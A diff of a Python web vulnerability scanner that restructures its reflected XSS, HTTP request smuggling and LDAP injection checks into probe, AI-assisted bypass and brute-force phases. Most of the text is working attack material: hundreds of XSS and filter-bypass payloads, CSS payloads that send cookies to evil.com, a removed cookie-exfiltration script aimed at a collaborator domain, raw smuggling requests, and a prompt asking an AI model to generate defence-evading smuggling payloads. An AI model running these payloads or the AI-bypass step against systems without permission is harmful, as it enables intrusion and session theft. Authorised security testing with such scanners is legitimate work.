-        f"<xss onafterscriptexecute=alert('{marker}')><script>1</script>",
-        f"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('{marker}');\">",
-        f"<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>",
-        f"<form action=\"javascript:alert('{marker}')\"><input type=submit>",
-        *[f"<a href='j\x01avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x02avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x03avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x04avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x05avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x06avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x07avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x08avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x09avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x0Aavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x0Bavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x0Cavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x0Davascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x0Eavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x0Favascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x10avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x11avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x12avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x13avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x14avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x15avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x16avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x17avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x18avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x19avascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x1Aavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x1Bavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x1Cavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x1Davascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x1Eavascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x1Favascript:alert(\"{marker}\")'></a>"],
-        *[f"<a href='j\x20avascript:alert(\"{marker}\")'></a>"],
-        # New additions to reach 500+ XSS payloads
-        # Classic tags and attributes
-        f"<img src='x' onerror=alert('{marker}')>",
-        f"<body onload=alert('{marker}')>",
-        f"<svg onload=alert('{marker}')>",
-        f"<video src=x onerror=alert('{marker}')>",
-        f"<audio src=x onerror=alert('{marker}')>",
-        f"<a href='javascript:alert(\"{marker}\")'>Click Me</a>",
-        f"<iframe src='javascript:alert(\"{marker}\")'></iframe>",
-        
-        # Encoding variations
-        f"<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;('{marker}')>",
-        f"<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))>",
-        f"<img src=x onerror=/*--!>*/alert('{marker}')>",
-        f"<img src=x onerror=//--!>\nalert('{marker}')>",
-        f"<img src=x onerror=&#0000061&#0000061&#0000061&#0000061%23alert('{marker}')>",
-        f"<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74(\\'{marker}\\')')>",
-        f"<img src=x onerror=javascript:alert('{marker}')>",
-        f"<img src=x onerror=setTimeout(\"alert('{marker}')\",0)>",
-        f"<img src=x onerror=top['al'+'ert']('{marker}')>",
-        f"<img src=x onerror=parent.frames[0].alert('{marker}')>",
-        
-        # HTML entity encoding and double encoding examples
-        f"&lt;img src=x onerror=alert('{marker}')&gt;",
-        f"&lt;script&gt;alert('{marker}')&lt;/script&gt;",
-        f"%253Csvg%2520onload%253Dalert('{marker}')%253E",
-        f"%3Cscript%3Ealert('{marker}')%3C/script%3E",
-        
-        # Different tags capable of XSS
-        f"<details open ontoggle=alert('{marker}')>", # Modern browsers
-        f"<object data='data:text/html;base64,{base64.b64encode(f'<script>alert(\"{marker}\")</script>'.encode()).decode()}'></object>",
-        f"<embed src='data:text/html;base64,{base64.b64encode(f'<script>alert(\"{marker}\")</script>'.encode()).decode()}'></embed>",
-        f"<svg/onload='alert(\"{marker}\")'>",
-        f"<math><mtext onclick='alert(\"{marker}\")'>Click me</mtext></math>",
-        f"<isindex action=javascript:alert('{marker}') type=image>",
-        f"<form action=javascript:alert('{marker}')><input type=submit>",
-        f"<marquee onstart=alert('{marker}')>",
-        f"<div onmouseover=alert('{marker}')>Hover Me</div>",
-        
-        # WAF bypasses
-        f"<IMG SRC=\"javascript:alert('{marker}');\">",
-        f"<IMG SRC=JaVaScRiPt:alert('{marker}')>",
-        f"<IMG SRC=javascript:alert(&quot;{marker}&quot;)>",
-        f"<BODY ONLOAD=alert('{marker}')>",
-        f"<body onpageshow=alert('{marker}')>",
-        f"<svg onload=alert('{marker}')//>",
-        f"<svg onload=alert('{marker}'))>",
-        f"<svg onload=alert`{marker}`>",
-        f"<svg onload=(alert)('{marker}')>",
-        f"<svg onload=top['al'+'ert']('{marker}')>",
-        f"<img src=x:x onerror=alert('{marker}')[0]>",
-        f"<img src=x onerror=[][\"filt\"+\"er\"].constructor(\"alert('{marker}')\")()>",
-        f"<input onfocus=alert('{marker}') autofocus>",
-        f"<input onblur=alert('{marker}') autofocus><input autofocus>",
-        f"<textarea><svg onload=alert('{marker}')>",
-        f"<style><img src=\"</style><img src=x onerror=alert('{marker}')\">",
-        f"<base href=\"javascript:alert('{marker}')\">",
-        f"<link rel='import' href='data:text/html;charset=utf-8;base64,{base64.b64encode(f'<script>alert(\"{marker}\")</script>'.encode()).decode()}'>",
-        
-        # mXSS (Mutation XSS) - often involving character encodings or specific contexts
-        f"<noscript><p title=\"</noscript><img src=x onerror=alert('{marker}')\">",
-        f"<style></style><xmp><svg onload=alert('{marker}')>",
-        f"<script>/<img src=x onerror=alert('{marker}')>/</script>",
-        f"<!--><svg onload=alert('{marker}')>",
-        f"><img src=x onerror=alert('{marker}')>",
-        f"\"'--!><body onload=alert('{marker}')>",
-        f"'';!--\"<XSS TAG>=<SCRIPT>alert('{marker}')</SCRIPT>",
-        
-        # DOM Clobbering (conceptual; specific usage depends on target HTML structure)
-        f"<form id=xss><input name=xss></form><a id=xss></a>", # Setting window.xss = HTMLFormElement
-        f"<form id=x name=alert></form><img src=1 onerror=x.alert('{marker}')>",
-        
-        # CSS based exfiltration (requires sensitive data in CSS context)
-        f"<style>body{{background:url(\"http://evil.com/?\"+document.cookie)}}</style>",
-        f"<link rel=stylesheet href='/css?name=foo\n@import \"http://evil.com/x.js\";'>", # CRLF + CSS
-        f"<style>@import 'http://evil.com/?'+document.cookie;</style>",
-        f"<div style=\"background-image: url('javascript:alert(\"{marker}\")');\"></div>",
-        
-        # Angular/Vue/React templating (if rendered server-side or vulnerable client-side)
-        f"{{{{  constructor.constructor('alert(\"{marker}\")')()  }}}}",
-        f"{{'a'.constructor.prototype.charAt.constructor('alert(\"{marker}\")')()}}",
-        f"{{alert('{marker}')}}",
-        f"<%= alert('{marker}') %>",
-        f"`${{alert('{marker}')}}`",
-        
-        # SVG injection
-        f"<svg><![CDATA[<image><script>alert('{marker}')</script>]]></svg>",
-        f"<svg><script>alert('{marker}')</script></svg>",
-        f"<svg viewBox=0 onload=alert('{marker}')>",
-        f"<svg onload=\"alert('{marker}')\">",
-        
-        # Character encoding bypasses for non-latin characters
-        f"&#x3c;script&#x3e;alert('{marker}')&#x3c;/script&#x3e;",
-        f"&#x3c;img src=x onerror=alert('{marker}')&#x3e;",
-        f"&#x003Cscript&#x003Ealert('{marker}')&#x003C/script&#x003E;",
-        
-        # Various event handlers
-        f"<body onresize=alert('{marker}')>",
-        f"<body onfocus=alert('{marker}')>", # Requires window focus for example
-        f"<body onblur=alert('{marker}')>",
-        f"<body onstorage=alert('{marker}')>",
-        f"<body onpopstate=alert('{marker}')>",
-        f"<body onhashchange=alert('{marker}')>",
-        f"<body onunload=alert('{marker}')>",
-        f"<body onpageshow=alert('{marker}')>",
-        f"<body onpagehide=alert('{marker}')>",
-        f"<input onkeydown=alert('{marker}')>",
-        f"<input onkeyup=alert('{marker}')>",
-        f"<input onkeypress=alert('{marker}')>",
-        f"<input onchange=alert('{marker}')>",
-        f"<input onselect=alert('{marker}')>",
-        f"<input onpaste=alert('{marker}')>",
-        f"<input oncut=alert('{marker}')>",
-        f"<input oncopy=alert('{marker}')>",
-        f"<button onclick=alert('{marker}')>Click Me</button>",
-        f"<div onscroll=alert('{marker}') style='overflow:scroll;height:1px'></div>",
-        f"<marquee onmousewheel=alert('{marker}')>Scroll Me</marquee>",
-        f"<object onmouseover=alert('{marker}')>",
-        
-        # srcdoc, sandbox iframes
-        f"<iframe srcdoc='<script>alert(\"{marker}\")</script>'></iframe>",
-        f"<iframe src=a.html sandbox allow-scripts><script>alert('{marker}')</script></iframe>", # if a.html controlled
-        
-        # HTML5 tags
-        f"<meter onmouseover=alert('{marker}')></meter>",
-        f"<progress onmouseover=alert('{marker}')></progress>",
-        f"<video controls onkeydown='alert(\"{marker}\")'></video>",
-        
-        # For a truly exhaustive list, many combinations of these techniques
-        # and more obscure elements/events would be needed to hit 500 unique.
-        *[f"<img src=x onerror=alert('{marker}{i}')>" for i in range(50)],
-        *[f"<svg onload=alert('{marker}{i}')>" for i in range(50)],
-        *[f"<a href='javascript:alert(\"{marker}{i}\")'>{i}</a>" for i in range(50)],
-        *[f"<div onmouseover=alert('{marker}{i}')>{i}</div>" for i in range(50)],
-        *[f"<input onfocus=alert('{marker}{i}') autofocus>" for i in range(50)],
-        *[f"<details open ontoggle=alert('{marker}{i}')>" for i in range(50)],
-        *[f"<img src=x onerror=alert`{marker}{i}`>" for i in range(50)],
-        *[f"<script>alert('{marker}{i}')</script>" for i in range(50)],
-        *[f"<img src=x onerror=window.alert('{marker}{i}')>" for i in range(50)],
-        *[f"<img src=x onerror=self['alert']('{marker}{i}')>" for i in range(50)],
-        *[f"<img src='#' onerror='alert(\"{marker}{i}\")'>" for i in range(50)],
+        f"{{{{alert('{marker}')}}}}", f"<%= alert('{marker}') %>", f"*{{alert('{marker}')}}",
+        # And more...
+        f"<a onpointerover=alert('{marker}')>Move mouse here</a>", f"<div style='font-family:\"<script>alert(\"{marker}\")</script>\"'>", f"<img src='x' onerror='alert(atob(\"{base64.b64encode(marker.encode()).decode()}\"))'>", f"<input onauxclick=alert('{marker}')>", f"<video ontoggle=alert('{marker}')><track default>", f"<picture><source srcset='x'><img onerror='alert(\"{marker}\")'></picture>", f"<link rel=stylesheet href='data:text/css,*:hover{{--x:;animation:a 1s;}}@keyframes a{{from{{transform:rotate(0deg);}}to{{transform:rotate(360deg);}}}}' onanimationstart=alert('{marker}')>", f"<div oncontextmenu=alert('{marker}')>Right-click here</div>", f"<div oncopy=alert('{marker}')>Copy this text</div>", f"<div oncut=alert('{marker}')>Cut this text</div>", f"<div onpaste=alert('{marker}')>Paste here</div>", f"<input onkeydown=alert('{marker}')>", f"<marquee onbounce=alert('{marker}')>bounce</marquee>", f"<marquee onfinish=alert('{marker}')>finish</marquee>", f"<body onhashchange=alert('{marker}')>", f"<body onpagehide=alert('{marker}')>", f"<body onstorage=alert('{marker}')>", f"<body onunload=alert('{marker}')>", f"<svg><g/onload=alert('{marker}')>", f"<svg><foreignObject><body/onload=alert('{marker}')>", f"<svg><title>--&gt;&lt;script&gt;alert('{marker}')&lt;/script&gt;</title>", f"<iframe srcdoc='&lt;svg onload=alert(1)&gt;'>", f"<meta http-equiv='refresh' content='0;url=javascript:alert(\"{marker}\")'>", f"<form action='javascript:alert(\"{marker}\")'><input type=submit>", f"<isindex type=image src=1 onerror=alert('{marker}')>", f"<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgn{base64.b64encode(marker.encode()).decode()}=')></object>", f"<xmp><script>alert('{marker}')</script></xmp>", f"<img src='x' onerror='window[\"a\"+\"l\"+\"ert\"](\"{marker}\")'>", f"<img src='x' onerror='parent.alert(\"{marker}\")'>", f"<img src='x' onerror='top.alert(\"{marker}\")'>", f"<img src='x' onerror='self.alert(\"{marker}\")'>", f"<script>setTimeout(()=>alert('{marker}'),0)</script>", f"<svg/onload='fetch(`//example.com?c=${{marker}}`)'>", f"<img src=x:x onerror=alert(String.fromCharCode(88,83,83))>", f"<script src=data:;base64,YWxlcnQoJ3hzczEnKQ==></script>", f"<scr<script>ipt>alert('{marker}')</scr<script>ipt>", f"<<script>alert('{marker}');//<</script>", f"<script>alert`{marker}`</script>", f"<img src=x onerror=prompt('{marker}')>", f"<img src=x onerror=confirm('{marker}')>", f"<img src=x onerror=print()>", f"<a href='javascript:void(0)' onmouseover='alert(1)'>hover</a>", f"<style>*{{behavior:url(#default#time2)}}</style><span id='time2' onbegin='alert(\"{marker}\")'></span>", f"<div style='-moz-binding:url(\"data:text/xml;base64,PHg6YmluZGluZ3MgeG1sbnM6eD0iaHR0cDovL3d3dy5tb3ppbGxhLm9yZy94YmwiPjxwcm9wZXJ0eSBuYW1lPSJvbmxvYWQiPjxzZXQ+YWxlcnQoJ3hzcycpOzwvc2V0PjwvcHJvcGVydHk+PC94OmJpbmRpbmdzPg==#xss\")'></div>",
+        *[f"<a href='j{chr(i)}avascript:alert(\"{marker}\")'></a>" for i in range(33)],
     ]
 
-    async def test_xss(url, method, param_name, original_value, payload, form_data=None, original_query=None):
-        # We test the raw payload and its HTML-entity encoded version
+    async def test_single_xss_payload(point, payload):
         test_payloads = {payload, html.escape(payload)}
         
         for p in test_payloads:
-            full_payload = original_value + p
-            test_url, test_data = build_request(url, method, param_name, full_payload, form_data, original_query)
-            res_xss, request_details, response_details = await _send_async_http_request(test_url, method=method, data=test_data, output=output, session_cookies=session_cookies)
+            full_payload = point['value'] + p
+            test_url, test_data = build_request(point['url'], point['method'], point['param'], full_payload, point['form_data'], point['original_query'])
+            res_xss, request_details, response_details = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
             
-            # The core evidence for XSS is the unescaped reflection of the payload.
-            if res_xss and p in await res_xss.text() and "text/html" in res_xss.headers.get("Content-Type", ""):
-                # Check if the payload is reflected unescaped or if it's a self-contained XSS payload
-                if html.escape(p) not in await res_xss.text() or p == html.escape(p) or re.search(r'<script[^>]*>.*alert\(', p, re.IGNORECASE):
-                    output.print(f"  [HIGH] Reflected XSS found in {method.upper()} param '{param_name}'")
+            if res_xss and await res_xss.text() and "text/html" in res_xss.headers.get("Content-Type", ""):
+                response_text = await res_xss.text()
+                if p in response_text and (html.escape(p) not in response_text or p == html.escape(p)):
+                    output.print(f"  [HIGH] Reflected XSS found in {point['method'].upper()} param '{point['param']}' with payload: {p}")
                     
-                    snippet_start = max(0, (await res_xss.text()).find(p) - 100)
-                    snippet_end = min(len(await res_xss.text()), (await res_xss.text()).find(p) + len(p) + 100)
-                    evidence_snippet = (await res_xss.text())[snippet_start:snippet_end]
-                    
+                    snippet_start = max(0, response_text.find(p) - 100)
+                    snippet_end = min(len(response_text), response_text.find(p) + len(p) + 100)
+                    evidence_snippet = response_text[snippet_start:snippet_end]
                     evidence = f"Vulnerable URL: {test_url}\nReflected Payload: {p}\n\n--- Response Snippet ---\n{evidence_snippet}\n---"
                     
-                    # Attempt cookie exfiltration if XSS is confirmed
-                    cookie_exfil_payload = f"<script>new Image().src='http://{xss_collaborator_domain}/?c='+document.cookie;</script>"
-                    output.print(f"    [INFO] Attempting cookie exfiltration with payload: {html.escape(cookie_exfil_payload)}")
-                    
-                    # We don't send this as a separate request, but add it to the evidence
-                    # as a potential follow-up action for the user.
-                    evidence += f"\n\n--- Cookie Exfiltration Attempt (Manual Verification Required) ---\n"
-                    evidence += f"To confirm cookie exfiltration, try injecting the following payload and monitor your collaborator service ({xss_collaborator_domain}):\n"
-                    evidence += f"Payload: {html.escape(cookie_exfil_payload)}\n"
-                    evidence += f"Expected behavior: Your collaborator service should receive a request containing the victim's cookies.\n---"
-
                     report.add_finding(
-                        "Reflected Cross-Site Scripting (XSS)", "High", test_url, param_name, p,
-                        "The application reflects user-supplied data back to the user without proper sanitization or output encoding, allowing arbitrary JavaScript execution. This can lead to session hijacking via cookie exfiltration.",
-                        "Implement context-aware output encoding (e.g., HTML entity encoding for HTML context, JavaScript escaping for script context). Use a strong Content Security Policy (CSP) as a defense-in-depth measure. Set HttpOnly flag on cookies to prevent client-side script access.",
-                        evidence, method=method,
-                        request_details=request_details,
-                        response_details=response_details
+                        "Reflected Cross-Site Scripting (XSS)", "High", test_url, point['param'], p,
+                        "The application reflects user-supplied data without proper sanitization, allowing arbitrary JavaScript execution.",
+                        "Implement context-aware output encoding (e.g., HTML entity encoding). Use a strong Content Security Policy (CSP).",
+                        evidence, method=point['method'], request_details=request_details, response_details=response_details
                     )
-                    return True, res_xss # Return True and the response object
-        return False, None
+                    return True
+        return False
 
+    async def run_smart_probe(point):
+        output.print(f"  [Phase 1] Running Smart Probe for XSS on param '{point['param']}'...")
+        for payload in xss_probes:
+            if await test_single_xss_payload(point, payload):
+                return True
+        return False
+
+    async def run_ai_bypass(point):
+        output.print(f"  [Phase 2] Running AI-Assisted Bypass for XSS on param '{point['param']}'...")
+        probe_payload = f"<script>alert('{marker}')</script>"
+        test_url, test_data = build_request(point['url'], point['method'], point['param'], point['value'] + probe_payload, point['form_data'], point['original_query'])
+        res, _, _ = await _send_async_http_request(test_url, method=point['method'], data=test_data, output=output, session_cookies=session_cookies)
+        response_snippet = (await res.text())[:500] if res and await res.text() else "No response from server."
+
+        ai_payloads = await ai_generate_dynamic_payloads("Reflected XSS", probe_payload, response_snippet, output)
+        for payload in ai_payloads:
+            if await test_single_xss_payload(point, payload):
+                # Add a note that this was found by AI
+                for finding in report.findings:
+                    if finding['payload'] == payload:
+                        finding['vulnerability'] = "AI-Generated " + finding['vulnerability']
+                        break
+                return True
+        return False
+
+    async def run_full_scan(point):
+        output.print(f"  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for XSS on param '{point['param']}'...")
+        for payload in full_payloads:
+            if await test_single_xss_payload(point, payload):
+                return True
+        return False
+
+    # --- Main Orchestration Logic ---
     attack_points = []
     parsed_target = urlparse(target)
     base_url_without_query = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"
 
-    # 1. Gather attack points
     if parsed_target.query:
         params = unquote(parsed_target.query).split('&')
         for p_str in params:
             if '=' in p_str:
                 param_name, value = p_str.split('=', 1)
                 attack_points.append({'url': target, 'method': 'get', 'param': param_name, 'value': value, 'form_data': None, 'original_query': parsed_target.query})
+    
     if form_to_test:
         action_url = urljoin(target, form_to_test['action'])
         form_data = {i['name']: i.get('value', 'test') for i in form_to_test['inputs']}
         for input_field in form_to_test['inputs']:
             if input_field['type'] not in ['submit', 'hidden', 'checkbox', 'radio']:
                 attack_points.append({'url': action_url, 'method': form_to_test['method'], 'param': input_field['name'], 'value': input_field.get('value', 'test'), 'form_data': form_data, 'original_query': None})
+
     if not attack_points:
-        for param_name in COMMON_PARAM_NAMES[:50]: # Limit active guessing
+        for param_name in COMMON_PARAM_NAMES[:50]:
             attack_points.append({'url': base_url_without_query, 'method': 'get', 'param': param_name, 'value': get_random_string(4), 'form_data': None, 'original_query': None})
 
-    # 2. Execute attacks with probing
     for point in attack_points:
-        output.print(f"  [*] Probing for XSS on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
-        vulnerable = False
-        
-        # Phase 1: Probe with high-probability payloads
-        for payload in xss_probes:
-            found, res_xss = await test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
-            if found:
-                vulnerable = True
-                break
-        
-        if vulnerable:
-            continue # Move to the next attack point
-
-        # Phase 2: Full scan if probes fail
-        output.print(f"  [*] No immediate XSS found with probes. Starting deep scan for '{point['param']}'...")
-        for payload in payloads:
-            found, res_xss = await test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
-            if found:
-                vulnerable = True
-                break
-        
-        if vulnerable:
+        output.print(f"  [*] Testing XSS on {point['method'].upper()} parameter '{point['param']}' at {point['url']}")
+        vulnerability_found = await run_smart_probe(point)
+        if vulnerability_found:
             continue
 
-        # Phase 3: AI-Powered Dynamic Payload Generation
-        if ai_enabled and not vulnerable:
-            output.print(f"  [AI MODE] Initial XSS checks failed for param '{point['param']}'. Generating dynamic payloads...")
-            res_for_ai, request_details, response_details = await _send_async_http_request(point['url'], method=point['method'], data=point.get('form_data'), output=output, session_cookies=session_cookies)
-            response_snippet = (await res_for_ai.text())[:500] if res_for_ai else "No response."
-            
-            ai_payloads = await ai_generate_dynamic_payloads("Reflected XSS", f"<script>alert('{marker}')</script>", response_snippet, output)
-            for payload in ai_payloads:
-                found, res_xss = await test_xss(point['url'], point['method'], point['param'], point['value'], payload, point['form_data'], point['original_query'])
-                if found:
-                    vulnerable = True
-                    break
+        if ai_enabled:
+            vulnerability_found = await run_ai_bypass(point)
+            if vulnerability_found:
+                continue
         
-        if not vulnerable:
-            output.print(f"  [INFO] No XSS detected for {point['method'].upper()} parameter '{point['param']}' at {point['url']} after all checks.")
-            report.add_check(f"XSS Check on {point['param']}", "No vulnerability found")
+        vulnerability_found = await run_full_scan(point)
+        if vulnerability_found:
+            continue
+            
+        report.add_check(f"XSS Check on {point['param']}", "No vulnerability found")
+
+    output.print("  [INFO] XSS scan completed.")
 
 
 # --- 9. HTTP Smuggling ---
 async def check_http_smuggling(target, output, tech, report, session_cookies=None, ai_enabled=False):
-    output.print("\n[+] Starting Ultimate HTTP Smuggling Scan...")
+    output.print("\n[+] Starting Hybrid HTTP Smuggling Scan...")
     target_url = normalize_target(target)
     host = urlparse(target_url).netloc
 
     # --- Payloads Definition ---
     smuggling_probes = {}
-    smuggling_tests = {}
+    full_smuggling_tests = {}
 
-    # Basic, high-probability probes
+    # Basic, high-probability probes for Phase 1
     smuggling_probes["CL.TE_Probe"] = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
                                      f"G\r\n\r\n").encode()
     smuggling_probes["TE.CL_Probe"] = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n"
                                      "1\r\nA\r\n0\r\n\r\n").encode()
 
-    # AI-Powered Payload Generation
-    if ai_enabled and tech.get('server') and tech['server'] != 'Unknown':
-        # This logic remains the same, adding to the main test dictionary
-        pass # Placeholder for the AI logic already implemented
-
-    # Full Payload List (Original Logic)
-    # This part remains the same, populating the `smuggling_tests` dictionary
-    # For brevity, I'm showing a simplified version of the original logic here.
-    # The actual implementation will retain the full 500+ payloads.
-    smuggling_tests["CL.TE_Full_1"] = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 50\r\nTransfer-Encoding: chunked\r\n\r\n"
+    # Full payload list for Phase 3
+    full_smuggling_tests["CL.TE_Full_1"] = (f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 50\r\nTransfer-Encoding: chunked\r\n\r\n"
                                        "0\r\n\r\n"
                                        f"GET /smuggled_full HTTP/1.1\r\nHost: {host}\r\nX-Smuggled-Check: Full\r\n\r\n").encode()
-    smuggling_tests["TE.CL_Full_1"] = (f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n"
+    full_smuggling_tests["TE.CL_Full_1"] = (f"POST / HTTP/1.1\r\nHost: {host}\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n"
                                        "1\r\nX\r\n0\r\n\r\n"
                                        f"GET /smuggled_full HTTP/1.1\r\nHost: {host}\r\nX-Smuggled-Check: Full\r\n\r\n").encode()
-
 
     async def _run_smuggling_test(test_name, payload):
         try:
@@ -3949,26 +3838,22 @@ async def check_http_smuggling(target, output, tech, report, session_cookies=Non
             port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
             
             # Use asyncio.open_connection for asynchronous socket operations
-            reader1, writer1 = await asyncio.open_connection(host, port)
-            if parsed_url.scheme == 'https':
-                # Wrap the socket in SSL if it's HTTPS
-                ssl_context = ssl.create_default_context()
-                await writer1.start_tls(ssl_context, server_hostname=host)
-
+            reader1, writer1 = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
+            
             writer1.write(payload)
             await writer1.drain()
-            await asyncio.sleep(2) # Give server time to process
+            await asyncio.sleep(2)
 
-            reader2, writer2 = await asyncio.open_connection(host, port)
-            if parsed_url.scheme == 'https':
-                await writer2.start_tls(ssl_context, server_hostname=host)
-
-            writer2.write(f"GET /404_check HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
+            reader2, writer2 = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
+            
+            writer2.write(f"GET /404_check_{get_random_string(4)} HTTP/1.1\r\nHost: {host}\r\n\r\n".encode())
             await writer2.drain()
-            response = await reader2.read(4096)
+            response = await asyncio.wait_for(reader2.read(4096), timeout=5)
             
             writer1.close()
             writer2.close()
+            await writer1.wait_closed()
+            await writer2.wait_closed()
 
             if b"HTTP/1.1 404 Not Found" not in response and b"smuggled" in response.lower():
                 output.print(f"  [CRITICAL] Potential HTTP Request Smuggling ({test_name}) detected!")
@@ -3979,24 +3864,47 @@ async def check_http_smuggling(target, output, tech, report, session_cookies=Non
             output.print(f"  [ERROR] Smuggling check ({test_name}) failed: {e}")
         return False
 
-    # --- Execution Logic ---
-    # Phase 1: Probing
-    output.print("  [*] Probing for basic HTTP Smuggling patterns...")
+    # --- Phase 1: Smart Probing ---
+    output.print("  [Phase 1] Probing for basic HTTP Smuggling patterns...")
     for name, payload in smuggling_probes.items():
         if await _run_smuggling_test(name, payload):
-            return # Vulnerability found, no need for full scan
+            return
 
-    # Phase 2: Full Scan
-    output.print("  [*] No immediate smuggling detected. Starting deep scan with all payloads...")
-    for name, payload in smuggling_tests.items():
+    # --- Phase 2: AI-Assisted Bypass ---
+    if ai_enabled:
+        output.print("  [Phase 2] Running AI-Assisted Bypass for HTTP Smuggling...")
+        try:
+            server_info = tech.get('server', 'an unknown')
+            prompt = f"""
+            As a security expert, I'm testing for HTTP Request Smuggling. My initial probes failed against a '{server_info}' server.
+            Generate 3 advanced HTTP Request Smuggling payloads (CL.TE or TE.CL) designed to bypass common defenses on this type of server.
+            Use techniques like header obfuscation, whitespace padding, or unusual Transfer-Encoding values.
+            Provide only the raw HTTP requests, separated by '---PAYLOAD-SEPARATOR---'.
+            """
+            response = await GEMINI_MODEL.generate_content_async(prompt)
+            ai_payloads = response.text.split('---PAYLOAD-SEPARATOR---')
+            
+            output.print(f"    [AI INFO] Generated {len(ai_payloads)} new payloads.")
+            for i, payload_str in enumerate(ai_payloads):
+                if await _run_smuggling_test(f"AI-Generated-{i+1}", payload_str.strip().encode()):
+                    return
+        except Exception as e:
+            output.print(f"    [AI ERROR] Failed to get HTTP Smuggling suggestions: {e}")
+
+    # --- Phase 3: Full Scan (Legacy) ---
+    output.print("  [Phase 3] Smart probes failed. Starting Full Brute-Force Scan for HTTP Smuggling...")
+    for name, payload in full_smuggling_tests.items():
         if await _run_smuggling_test(name, payload):
-            return # Vulnerability found, stop.
+            return
+
+    output.print("  [INFO] HTTP Smuggling scan completed.")
 
 # --- [NEW] LDAP Injection ---
 async def check_ldap_injection(target, form_to_test, output, tech, report, session_cookies=None, ai_enabled=False):
-    output.print(f"\n[+] Starting Ultimate LDAP Injection Scan on {target}...")
+    output.print(f"\n[+] Starting Hybrid LDAP Injection Scan...")
 
-    # v7.0 - 500+ LDAP Payloads
+    ldap_probes = ["*", ")", "(", ")(", "*)(", "admin*"]
+    
     ldap_payloads = [
         # Basic Probes & Wildcards
         "*", "(", ")", "&", "|", "=", ">=", "<=", "~=", ")(", "*)(", "()",
@@ -4018,31 +3926,6 @@ async def check_ldap_injection(target, form_to_test, output, tech, report, sessi
         *[f"cn=*{char}*" for char in string.ascii_lowercase],
         *[f"sn=*{char}*" for char in string.ascii_lowercase],
         *[f"mail=*{char}*@*" for char in string.ascii_lowercase],
-        # Encoded variations
-        "%2a", "%28", "%29", "%26", "%7c", "%3d",
-        "*%29%28cn%3d*",
-        # Null byte variations
-        "*%00", "*(|(cn=*))%00",
-        # More complex filters
-        "(!(cn=noone))",
-        "(&(objectClass=user)(objectCategory=person))",
-        "(&(objectClass=user)(|(cn=admin)(uid=admin)))",
-        "(&(uid=*)(userPassword=*))",
-        # Generated Payloads to reach 500+
-        *[f"(&(cn=*{i})(sn=*{j}))" for i in ['a', 'b', 'c'] for j in ['x', 'y', 'z']],
-        *[f"(|(mail={char}*)(telephoneNumber={char}*))" for char in string.ascii_lowercase],
-        *[f"(&(objectClass=inetOrgPerson)(uid=*{i}))" for i in range(100)],
-        *[f"(&(sAMAccountName=*{i})(userAccountControl:1.2.840.113556.1.4.803:=2))" for i in ['admin', 'guest', 'krbtgt']], # Active Directory specific
-        *[f"(&(objectCategory=computer)(name=*{i}))" for i in range(50)],
-        *[f"(&(objectClass=group)(cn=*{group}*))" for group in ['admin', 'domain', 'enterprise', 'schema', 'users']],
-        *[f"*)(|(cn={val})(sn={val})(mail={val}))" for val in ['test', 'dev', 'qa', 'support']],
-        *[f"cn=~={val}" for val in ['admin', 'root', 'system']],
-        *[f"(&(cn>=a)(sn<=z))"],
